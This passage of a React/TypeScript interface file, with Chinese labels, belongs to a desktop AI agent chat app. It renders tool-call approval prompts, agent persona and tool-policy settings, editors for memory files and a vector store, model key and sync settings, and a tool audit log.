                                  <span className="text-zinc-500 font-mono">命令行指令:</span>
                                  <pre className="font-mono text-zinc-200 bg-zinc-950 p-2.5 rounded border border-zinc-850 overflow-x-auto text-[11px] mt-1">
                                    {tc.args}
                                  </pre>
                                </div>

                                {isPending && (
                                  <div className="bg-zinc-900/50 p-2.5 rounded border border-zinc-850 flex items-start gap-2">
                                    <AlertTriangle className="h-4 w-4 text-amber-500 shrink-0 mt-0.5" />
                                    <p className="text-[11px] text-zinc-400">
                                      根据 <b>{activeAgent.name}</b> 规则，运行此命令行需人工审核批准。
                                    </p>
                                  </div>
                                )}

                                {tc.output && (
                                  <pre className="p-2.5 text-[10px] font-mono bg-zinc-950 text-zinc-400 max-h-36 overflow-y-auto whitespace-pre-wrap border border-zinc-850 rounded">
                                    {tc.output}
                                  </pre>
                                )}
                              </div>

                              {isPending && (
                                <div className="px-4 py-2.5 bg-zinc-900/30 border-t border-zinc-800/60 flex justify-end gap-2">
                                  <button
                                    onClick={() => handleRejectTool(message.id, index)}
                                    className="px-3 py-1 text-xs text-rose-400 bg-rose-500/10 hover:bg-rose-500/20 rounded border border-rose-500/20 transition-all"
                                  >
                                    拒绝执行 (Esc)
                                  </button>
                                  <button
                                    onClick={() => handleApproveTool(message.id, index)}
                                    className="px-3 py-1 text-xs text-emerald-400 bg-emerald-500/10 hover:bg-emerald-500/20 rounded border border-emerald-500/20 transition-all"
                                  >
                                    授权运行 (Ctrl+Enter)
                                  </button>
                                </div>
                              )}
                            </div>
                          );
                        }

                        // 3. Regular Markdown output text
                        return (
                          <div key={index} className="text-sm leading-relaxed text-zinc-200 prose prose-zinc prose-sm">
                            {part.content.includes("```") ? (
                              <div>
                                {part.content.split("```").map((chunk, i) => {
                                  if (i % 2 === 1) {
                                    const lines = chunk.split("\n");
                                    const lang = lines[0] || "javascript";
                                    const code = lines.slice(1).join("\n");
                                    return (
                                      <div key={i} className="my-2 rounded-lg overflow-hidden border border-zinc-800 font-mono text-[11px]">
                                        <div className="bg-zinc-900 px-3 py-1 flex justify-between items-center text-[10px] text-zinc-500">
                                          <span>{lang}</span>
                                          <button onClick={() => navigator.clipboard.writeText(code)} className="hover:text-zinc-300">复制</button>
                                        </div>
                                        <pre className="bg-zinc-950 p-3 overflow-x-auto text-zinc-300">{code}</pre>
                                      </div>
                                    );
                                  }
                                  return <p key={i} className="my-1 whitespace-pre-wrap">{chunk}</p>;
                                })}
                              </div>
                            ) : (
                              part.content
                            )}
                          </div>
                        );
                      })}
                    </div>
                  )}

                  <span className="block text-[9px] text-zinc-600">
                    {message.createdAt}
                  </span>
                </div>
              </div>
            );
          })}

          {isStreaming && currentMessages[currentMessages.length - 1]?.role === "user" && (
            <div className="flex gap-4 justify-start">
              <div className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-full ${activeAgent.avatarColor} font-bold text-white text-xs shadow-sm`}>
                {activeAgent.name.charAt(0)}
              </div>
              <div className="bg-zinc-900/60 border border-zinc-850 px-4 py-2.5 rounded-2xl rounded-tl-sm flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-zinc-500 dot-bounce"></span>
                <span className="w-1.5 h-1.5 rounded-full bg-zinc-500 dot-bounce"></span>
                <span className="w-1.5 h-1.5 rounded-full bg-zinc-500 dot-bounce"></span>
                <span className="text-[11px] text-zinc-500 ml-1 font-mono">{activeAgent.name} 思考中...</span>
              </div>
            </div>
          )}

          <div ref={messageEndRef} />
        </div>

        {/* Input box */}
        <div className="border-t border-zinc-800 bg-zinc-950 p-4">
          <div className="max-w-4xl mx-auto relative rounded-xl border border-zinc-800 bg-zinc-900/20 p-2 focus-within:border-zinc-700 transition-all">
            <textarea
              value={inputVal}
              onChange={(e) => setInputVal(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === "Enter" && !e.shiftKey) {
                  e.preventDefault();
                  handleSend();
                }
              }}
              placeholder={`向 ${activeAgent.name} 发送命令或消息... (Enter 发送)`}
              className="w-full resize-none bg-transparent px-3 py-1.5 text-sm text-zinc-100 placeholder:text-zinc-600 focus:outline-none h-12"
            />
            <div className="flex items-center justify-between border-t border-zinc-850 pt-2 px-1 text-[10px] text-zinc-600">
              <span>提示：Agent 运行环境受 tool_policy 保护</span>
              <div className="flex items-center gap-2">
                {isStreaming && (
                  <button 
                    onClick={() => setIsStreaming(false)}
                    className="px-2 py-0.5 rounded text-[10px] bg-rose-500/10 border border-rose-500/20 text-rose-400 hover:bg-rose-500/20"
                  >
                    停止
                  </button>
                )}
                <Button 
                  onClick={() => handleSend()}
                  disabled={!inputVal.trim() || isStreaming}
                  className="rounded-lg bg-zinc-100 hover:bg-zinc-200 text-zinc-950 px-3 py-1 h-6 text-[10px] font-semibold"
                >
                  <Send className="h-3 w-3 mr-1" />
                  <span>运行</span>
                </Button>
              </div>
            </div>
          </div>
        </div>

      </main>

      {/* --- MODAL: FULL-SCREEN CONFIGURATION & SETTINGS CENTER --- */}
      {isSettingsOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 backdrop-blur-sm">
          <div className="w-[960px] h-[640px] border border-zinc-800 bg-zinc-900 rounded-xl overflow-hidden shadow-2xl flex flex-col animate-in fade-in zoom-in-95 duration-150">
            
            {/* Header */}
            <header className="px-5 py-4 border-b border-zinc-800 bg-zinc-950/40 flex justify-between items-center shrink-0">
              <div className="flex items-center gap-2">
                <Sliders className="h-4.5 w-4.5 text-violet-400" />
                <span className="font-semibold text-zinc-200 text-sm">配置与控制中心 (Dashboard Center)</span>
              </div>
              <button 
                onClick={() => setIsSettingsOpen(false)}
                className="text-zinc-500 hover:text-zinc-200 rounded p-1 hover:bg-zinc-800 transition-colors"
              >
                <X className="h-4 w-4" />
              </button>
            </header>

            {/* Main content body (Two panes) */}
            <div className="flex flex-1 overflow-hidden">
              
              {/* Settings Left Menu */}
              <nav className="w-56 border-r border-zinc-800 bg-zinc-950/20 p-3 flex flex-col gap-1 shrink-0">
                <button
                  onClick={() => setSettingsTab("agents")}
                  className={`w-full flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium text-left transition-colors ${
                    settingsTab === "agents" ? "bg-zinc-800 text-zinc-100" : "text-zinc-400 hover:bg-zinc-800/30 hover:text-zinc-200"
                  }`}
                >
                  <User className="h-4 w-4" />
                  <span>智能体与角色卡 (Agents)</span>
                </button>
                <button
                  onClick={() => setSettingsTab("memory")}
                  className={`w-full flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium text-left transition-colors ${
                    settingsTab === "memory" ? "bg-zinc-800 text-zinc-100" : "text-zinc-400 hover:bg-zinc-800/30 hover:text-zinc-200"
                  }`}
                >
                  <Database className="h-4 w-4" />
                  <span>记忆编辑器 (Memory)</span>
                </button>
                <button
                  onClick={() => setSettingsTab("llm")}
                  className={`w-full flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium text-left transition-colors ${
                    settingsTab === "llm" ? "bg-zinc-800 text-zinc-100" : "text-zinc-400 hover:bg-zinc-800/30 hover:text-zinc-200"
                  }`}
                >
                  <Sliders className="h-4 w-4" />
                  <span>模型与同步 (LLM & Sync)</span>
                </button>
                <button
                  onClick={() => setSettingsTab("audit")}
                  className={`w-full flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium text-left transition-colors ${
                    settingsTab === "audit" ? "bg-zinc-800 text-zinc-100" : "text-zinc-400 hover:bg-zinc-800/30 hover:text-zinc-200"
                  }`}
                >
                  <ShieldCheck className="h-4 w-4" />
                  <span>工具执行日志 (Audit)</span>
                </button>
              </nav>

              {/* Settings Right panel details */}
              <div className="flex-1 overflow-y-auto p-6 bg-zinc-900/20">
                
                {/* 1. AGENTS TAB: Manage and Configure Agents */}
                {settingsTab === "agents" && (
                  <div className="space-y-6">
                    {/* List switcher & Add */}
                    <div className="flex justify-between items-center border-b border-zinc-800 pb-3">
                      <div>
                        <h3 className="text-sm font-semibold text-zinc-200">角色切换与管理</h3>
                        <p className="text-[11px] text-zinc-500">选择您要对话的活跃 Agent，或自定义添加新卡片。</p>
                      </div>
                      <button 
                        onClick={() => {
                          const newId = `agent_${Date.now()}`;
                          const newA: Agent = {
                            id: newId,
                            name: "自定义智能体",
                            avatarColor: "bg-blue-500",
                            tags: ["Custom"],
                            description: "新自定义的角色描述...",
                            model: "Claude 3.5 Sonnet",
                            persona: "请在此配置角色的人格设定特性...",
                            systemPrompt: "System rules here...",
                            greeting: "您好！有什么我可以为您服务的吗？",
                            toolPolicy: {
                              shell: { enabled: true, approval: "always" },
                              file: { enabled: true, approval: "write" },
                              git: { enabled: true, approval: "always" }
                            }
                          };
                          setAgents(prev => [...prev, newA]);
                          setEditingAgent(newA);
                        }}
                        className="flex items-center gap-1 text-xs font-semibold text-zinc-900 bg-zinc-100 hover:bg-zinc-200 px-3 py-1.5 rounded-lg transition-colors"
                      >
                        <Plus className="h-3.5 w-3.5" />
                        <span>添加新智能体</span>
                      </button>
                    </div>

                    {/* Agent grid cards */}
                    <div className="grid grid-cols-3 gap-3">
                      {agents.map((agent) => {
                        const isActive = agent.id === activeAgentId;
                        const isSelected = editingAgent?.id === agent.id;
                        return (
                          <div 
                            key={agent.id}
                            onClick={() => setEditingAgent({ ...agent })}
                            className={`p-3 rounded-lg border text-left cursor-pointer transition-all ${
                              isSelected 
                                ? "border-violet-500 bg-violet-950/5 shadow" 
                                : "border-zinc-800 bg-zinc-950/20 hover:border-zinc-700"
                            }`}
                          >
                            <div className="flex items-center gap-2 mb-2">
                              <div className={`h-6 w-6 rounded-full ${agent.avatarColor} flex items-center justify-center text-[10px] font-bold text-white`}>
                                {agent.name.charAt(0)}
                              </div>
                              <span className="font-medium text-xs text-zinc-200">{agent.name}</span>
                              {isActive && (
                                <span className="text-[9px] bg-emerald-500/10 text-emerald-400 px-1 rounded ml-auto">
                                  活跃中
                                </span>
                              )}
                            </div>
                            <p className="text-[10px] text-zinc-500 truncate">{agent.description}</p>
                            <div className="flex items-center justify-between mt-3 text-[10px]">
                              <span className="text-zinc-600 font-mono">{agent.model.split(" ")[0]}</span>
                              {!isActive && (
                                <button
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    handleSwitchAgent(agent.id);
                                  }}
                                  className="text-violet-400 hover:text-violet-300 font-semibold"
                                >
                                  激活并聊天
                                </button>
                              )}
                            </div>
                          </div>
                        );
                      })}
                    </div>

                    {/* Editor Form */}
                    {editingAgent && (
                      <div className="border border-zinc-800 bg-zinc-950/30 rounded-xl p-5 space-y-4">
                        <div className="flex justify-between items-center border-b border-zinc-850 pb-2">
                          <span className="text-xs font-semibold text-zinc-400 uppercase">人设卡参数配置: {editingAgent.name}</span>
                          <button 
                            onClick={handleSaveAgentConfig}
                            className="flex items-center gap-1 text-[11px] font-semibold text-emerald-400 hover:text-emerald-300 transition-colors"
                          >
                            <Save className="h-3.5 w-3.5" />
                            <span>保存此角色修改</span>
                          </button>
                        </div>

                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <label className="block text-[11px] text-zinc-500 mb-1">智能体名称</label>
                            <input 
                              type="text" 
                              value={editingAgent.name} 
                              onChange={(e) => setEditingAgent({ ...editingAgent, name: e.target.value })}
                              className="w-full bg-zinc-950 border border-zinc-850 rounded-lg px-3 py-1.5 text-xs text-zinc-200 focus:outline-none focus:border-zinc-700"
                            />
                          </div>
                          <div>
                            <label className="block text-[11px] text-zinc-500 mb-1">头颜色标识 (CSS 类)</label>
                            <select 
                              value={editingAgent.avatarColor}
                              onChange={(e) => setEditingAgent({ ...editingAgent, avatarColor: e.target.value })}
                              className="w-full bg-zinc-950 border border-zinc-850 rounded-lg px-3 py-1.5 text-xs text-zinc-200 focus:outline-none"
                            >
                              <option value="bg-indigo-500">蓝色 (indigo)</option>
                              <option value="bg-emerald-500">绿色 (emerald)</option>
                              <option value="bg-amber-500">黄色 (amber)</option>
                              <option value="bg-rose-500">红色 (rose)</option>
                              <option value="bg-zinc-600">灰色 (zinc)</option>
                            </select>
                          </div>
                        </div>

                        <div>
                          <label className="block text-[11px] text-zinc-500 mb-1">开场欢迎语 (Greeting)</label>
                          <input 
                            type="text" 
                            value={editingAgent.greeting}
                            onChange={(e) => setEditingAgent({ ...editingAgent, greeting: e.target.value })}
                            className="w-full bg-zinc-950 border border-zinc-850 rounded-lg px-3 py-1.5 text-xs text-zinc-200 focus:outline-none"
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] text-zinc-500 mb-1">人格与背景设定 (Persona)</label>
                          <textarea 
                            value={editingAgent.persona}
                            onChange={(e) => setEditingAgent({ ...editingAgent, persona: e.target.value })}
                            className="w-full h-16 bg-zinc-950 border border-zinc-850 rounded-lg px-3 py-1.5 text-xs text-zinc-200 focus:outline-none focus:border-zinc-700 resize-none"
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] text-zinc-500 mb-1">系统 System Prompt</label>
                          <textarea 
                            value={editingAgent.systemPrompt}
                            onChange={(e) => setEditingAgent({ ...editingAgent, systemPrompt: e.target.value })}
                            className="w-full h-14 bg-zinc-950 border border-zinc-850 rounded-lg px-3 py-1.5 text-xs text-zinc-200 focus:outline-none focus:border-zinc-700 resize-none font-mono"
                          />
                        </div>

                        {/* Tool execution policies */}
                        <div className="space-y-2 pt-2 border-t border-zinc-850">
                          <span className="block text-[10px] text-zinc-500 uppercase tracking-wider font-semibold">工具调用规则设定 (Tool policy)</span>
                          <div className="grid grid-cols-2 gap-2 text-xs">
                            <div className="flex items-center justify-between p-2 rounded bg-zinc-950 border border-zinc-850">
                              <span>Shell 执行许可</span>
                              <div className="flex items-center gap-2">
                                <select
                                  value={editingAgent.toolPolicy.shell.approval}
                                  onChange={(e) => {
                                    const updated = { ...editingAgent.toolPolicy.shell, approval: e.target.value as any };
                                    setEditingAgent({
                                      ...editingAgent,
                                      toolPolicy: { ...editingAgent.toolPolicy, shell: updated }
                                    });
                                  }}
                                  className="bg-zinc-900 border border-zinc-800 text-[10px] px-1.5 py-0.5 rounded text-zinc-300"
                                >
                                  <option value="always">必审</option>
                                  <option value="write">写时审</option>
                                  <option value="never">免审</option>
                                </select>
                                <input 
                                  type="checkbox" 
                                  checked={editingAgent.toolPolicy.shell.enabled} 
                                  onChange={(e) => {
                                    const updated = { ...editingAgent.toolPolicy.shell, enabled: e.target.checked };
                                    setEditingAgent({
                                      ...editingAgent,
                                      toolPolicy: { ...editingAgent.toolPolicy, shell: updated }
                                    });
                                  }}
                                  className="rounded text-violet-600 bg-zinc-900 border-zinc-800"
                                />
                              </div>
                            </div>
                            <div className="flex items-center justify-between p-2 rounded bg-zinc-950 border border-zinc-850">
                              <span>文件写入许可</span>
                              <div className="flex items-center gap-2">
                                <select
                                  value={editingAgent.toolPolicy.file.approval}
                                  onChange={(e) => {
                                    const updated = { ...editingAgent.toolPolicy.file, approval: e.target.value as any };
                                    setEditingAgent({
                                      ...editingAgent,
                                      toolPolicy: { ...editingAgent.toolPolicy, file: updated }
                                    });
                                  }}
                                  className="bg-zinc-900 border border-zinc-800 text-[10px] px-1.5 py-0.5 rounded text-zinc-300"
                                >
                                  <option value="always">必审</option>
                                  <option value="write">写时审</option>
                                  <option value="never">免审</option>
                                </select>
                                <input 
                                  type="checkbox" 
                                  checked={editingAgent.toolPolicy.file.enabled} 
                                  onChange={(e) => {
                                    const updated = { ...editingAgent.toolPolicy.file, enabled: e.target.checked };
                                    setEditingAgent({
                                      ...editingAgent,
                                      toolPolicy: { ...editingAgent.toolPolicy, file: updated }
                                    });
                                  }}
                                  className="rounded text-violet-600 bg-zinc-900 border-zinc-800"
                                />
                              </div>
                            </div>
                          </div>
                        </div>

                      </div>
                    )}
                  </div>
                )}

                {/* 2. MEMORY TAB: Editable raw text files and Semantic vector memory db */}
                {settingsTab === "memory" && (
                  <div className="space-y-6">
                    <div>
                      <h3 className="text-sm font-semibold text-zinc-200">角色专属记忆空间: {activeAgent.name}</h3>
                      <p className="text-[11px] text-zinc-500">编辑持久的必注入记忆文件，或检索清理向量数据库。</p>
                    </div>

                    {/* Tabs switcher: files vs database */}
                    <div className="flex border-b border-zinc-800 text-xs">
                      <button 
                        onClick={() => setMemoryEditFileTab("memory")}
                        className={`px-4 py-2 border-b-2 font-medium ${
                          memoryEditFileTab === "memory" ? "border-violet-500 text-violet-400" : "border-transparent text-zinc-500"
                        }`}
                      >
                        必注记忆 (MEMORY.md / USER.md)
                      </button>
                      <button 
                        onClick={() => setMemoryEditFileTab("user")} // repurpose this state tab for db search
                        className={`px-4 py-2 border-b-2 font-medium ${
                          memoryEditFileTab === "user" ? "border-violet-500 text-violet-400" : "border-transparent text-zinc-500"
                        }`}
                      >
                        语义记忆数据库 (Vector DB)
                      </button>
                    </div>

                    {/* Sub-tab 1: MD Files editing */}
                    {memoryEditFileTab === "memory" && (
                      <div className="grid grid-cols-2 gap-4">
                        {/* USER.md */}
                        <div className="space-y-2 flex flex-col">
                          <div className="flex justify-between items-center text-xs">
                            <span className="font-semibold text-zinc-400">USER.md (AI只读，用户画像)</span>
                            {isEditingUserMd ? (
                              <div className="flex gap-2">
                                <button onClick={() => { setUserMdText(activeMemStore.userMd); setIsEditingUserMd(false); }} className="text-zinc-500">取消</button>
                                <button onClick={handleSaveUserMd} className="text-emerald-400 font-semibold">保存</button>
                              </div>
                            ) : (
                              <button onClick={() => setIsEditingUserMd(true)} className="text-violet-400">编辑</button>
                            )}
                          </div>
                          {isEditingUserMd ? (
                            <textarea 
                              value={userMdText} 
                              onChange={(e) => setUserMdText(e.target.value)}
                              className="h-72 w-full bg-zinc-950 border border-zinc-850 rounded-lg p-3 font-mono text-[10px] focus:outline-none"
                            />
                          ) : (
                            <pre className="h-72 w-full bg-zinc-950/60 border border-zinc-850 rounded-lg p-3 font-sans text-xs text-zinc-400 overflow-y-auto whitespace-pre-wrap">
                              {activeMemStore.userMd}
                            </pre>
                          )}
                        </div>

                        {/* MEMORY.md */}
                        <div className="space-y-2 flex flex-col">
                          <div className="flex justify-between items-center text-xs">
                            <span className="font-semibold text-zinc-400">MEMORY.md (AI可改，规则备忘)</span>
                            {isEditingMemoryMd ? (
                              <div className="flex gap-2">
                                <button onClick={() => { setMemoryMdText(activeMemStore.memoryMd); setIsEditingMemoryMd(false); }} className="text-zinc-500">取消</button>
                                <button onClick={handleSaveMemoryMd} className="text-emerald-400 font-semibold">保存</button>
                              </div>
                            ) : (
                              <button onClick={() => setIsEditingMemoryMd(true)} className="text-violet-400">编辑</button>
                            )}
                          </div>
                          {isEditingMemoryMd ? (
                            <textarea 
                              value={memoryMdText} 
                              onChange={(e) => setMemoryMdText(e.target.value)}
                              className="h-72 w-full bg-zinc-950 border border-zinc-850 rounded-lg p-3 font-mono text-[10px] focus:outline-none"
                            />
                          ) : (
                            <pre className="h-72 w-full bg-zinc-950/60 border border-zinc-850 rounded-lg p-3 font-sans text-xs text-zinc-400 overflow-y-auto whitespace-pre-wrap">
                              {activeMemStore.memoryMd}
                            </pre>
                          )}
                        </div>
                      </div>
                    )}

                    {/* Sub-tab 2: Vector list filter & delete */}
                    {memoryEditFileTab === "user" && (
                      <div className="space-y-3">
                        <div className="relative">
                          <Search className="absolute left-3 top-2.5 h-3.5 w-3.5 text-zinc-500" />
                          <input
                            type="text"
                            placeholder="搜索语义事实与偏好记录..."
                            value={memorySearch}
                            onChange={(e) => setMemorySearch(e.target.value)}
                            className="w-full bg-zinc-950 pl-9 pr-3 py-2 text-xs rounded-lg border border-zinc-800 focus:outline-none"
                          />
                        </div>

                        <div className="space-y-2 max-h-80 overflow-y-auto">
                          {filteredSemanticMemories.map((item) => (
                            <div key={item.id} className="group border border-zinc-850 bg-zinc-950/30 hover:bg-zinc-950/60 p-3 rounded-lg flex items-center justify-between text-xs transition-all">
                              <div className="space-y-1">
                                <p className="text-zinc-200 leading-relaxed pr-6">{item.content}</p>
                                <div className="flex items-center gap-2 text-[9px] text-zinc-500">
                                  <span className="bg-zinc-900 border border-zinc-850 px-1 rounded text-zinc-400">{item.type}</span>
                                  <span className="text-violet-400">置信: {(item.confidence * 100).toFixed(0)}%</span>
                                  <span>来源: {item.source}</span>
                                </div>
                              </div>
                              <button
                                onClick={() => handleDeleteMemoryItem(item.id)}
                                className="text-zinc-600 hover:text-rose-400 p-1.5 rounded hover:bg-zinc-900 transition-colors shrink-0"
                                title="删除此事实条目"
                              >
                                <Trash2 className="h-3.5 w-3.5" />
                              </button>
                            </div>
                          ))}
                          {filteredSemanticMemories.length === 0 && (
                            <div className="text-center py-8 text-xs text-zinc-600">
                              未搜索到符合匹配的记忆事实
                            </div>
                          )}
                        </div>
                      </div>
                    )}

                  </div>
                )}

                {/* 3. LLM & SYNC TAB: API Key keyring and Cloudflare Workers settings */}
                {settingsTab === "llm" && (
                  <div className="space-y-5">
                    <div>
                      <h3 className="text-sm font-semibold text-zinc-200">模型提供商与同步设置</h3>
                      <p className="text-[11px] text-zinc-500">设置用于模型接口的密钥，并管理多端云同步配置。</p>
                    </div>

                    <div className="border border-zinc-800 bg-zinc-950/20 rounded-xl p-5 space-y-4">
                      <div className="space-y-2">
                        <span className="block text-xs font-semibold text-zinc-400 uppercase">OS Keyring 托管密钥</span>
                        <div className="flex items-center gap-2 bg-zinc-950 border border-zinc-850 px-3 py-2 rounded-lg text-xs">
                          <Key className="h-4 w-4 text-zinc-500" />
                          <input type="password" value="sk-proj-xxxxxxxxxxxxxxxxxxxxxxxx" disabled className="bg-transparent flex-1 text-zinc-400 font-mono" />
                          <span className="text-[10px] text-zinc-500 bg-zinc-900 border border-zinc-850 px-1.5 py-0.5 rounded">Tauri Keyring 保护</span>
                        </div>
                      </div>

                      <div className="space-y-3 pt-3 border-t border-zinc-850">
                        <span className="block text-xs font-semibold text-zinc-400 uppercase">Cloudflare Sync 网关 (D1 数据库)</span>
                        <div className="grid grid-cols-2 gap-4 text-xs">
                          <div>
                            <label className="block text-zinc-500 mb-1">同步节点 Worker API</label>
                            <input type="text" defaultValue="https://agnes-sync.caiwen.workers.dev" className="w-full bg-zinc-950 border border-zinc-850 rounded-lg px-3 py-1.5 text-zinc-200 focus:outline-none" />
                          </div>
                          <div>
                            <label className="block text-zinc-500 mb-1">本机同步 ID (UUID)</label>
                            <input type="text" value="7d938f32-cf72-4e9f-863a-ea9387d8df93" disabled className="w-full bg-zinc-950 border border-zinc-850 rounded-lg px-3 py-1.5 text-zinc-500 font-mono" />
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* 4. AUDIT TAB: Log audit stream of tool calls */}
                {settingsTab === "audit" && (
                  <div className="space-y-4">
                    <div className="flex justify-between items-center border-b border-zinc-800 pb-3">
                      <div>
                        <h3 className="text-sm font-semibold text-zinc-200">本地工具审计流水 (rusqlite DB)</h3>
                        <p className="text-[11px] text-zinc-500">查看已被 Rust 执行平面记录的本地进程操作流水线。</p>
                      </div>
                      <button 
                        onClick={() => setAuditLogs([])} 
                        className="flex items-center gap-1 text-xs text-zinc-500 hover:text-rose-400 transition-colors"
                      >
                        <Trash2 className="h-3.5 w-3.5" />
                        <span>清除日志</span>
                      </button>
                    </div>

                    <div className="space-y-2 max-h-[360px] overflow-y-auto">
                      {auditLogs.map((log) => (
                        <div key={log.id} className="border border-zinc-850 bg-zinc-950/40 p-3 rounded-lg flex items-center justify-between text-xs font-mono">
                          <div className="space-y-1 overflow-hidden mr-4">
                            <div className="flex items-center gap-2">
                              <span className="text-zinc-500">{log.time}</span>
                              <span className="text-zinc-300 font-medium">{log.agent}</span>
                              <span className="bg-zinc-900 border border-zinc-850 px-1.5 py-0.5 rounded text-[10px] text-zinc-400">
                                {log.tool}
                              </span>
                            </div>
                            <p className="text-zinc-400 truncate max-w-[480px]">
                              参数: <code className="text-zinc-500 bg-zinc-900 px-1 py-0.5 rounded font-mono">{log.params}</code>
                            </p>
                          </div>

                          <div className="flex items-center gap-3 shrink-0 text-[10px]">
                            <span className={`px-1.5 py-0.5 rounded ${
                              log.risk === "High" ? "bg-rose-500/10 text-rose-400" : "bg-zinc-900 text-zinc-500"
                            }`}>
                              {log.risk}
                            </span>
                            <span className={`font-semibold ${log.status === "Succeeded" ? "text-emerald-400" : "text-rose-400"}`}>
                              {log.status}
                            </span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

              </div>
            </div>

            {/* Footer */}
            <footer className="px-5 py-3 border-t border-zinc-800 bg-zinc-950/40 flex justify-end shrink-0">
              <Button 
                onClick={() => setIsSettingsOpen(false)}
                className="bg-zinc-800 text-zinc-300 border border-zinc-700 hover:bg-zinc-700 text-xs px-4 h-8 font-medium"
              >
                返回对话
              </Button>
            </footer>

          </div>
        </div>
      )}

    </div>
  );
}
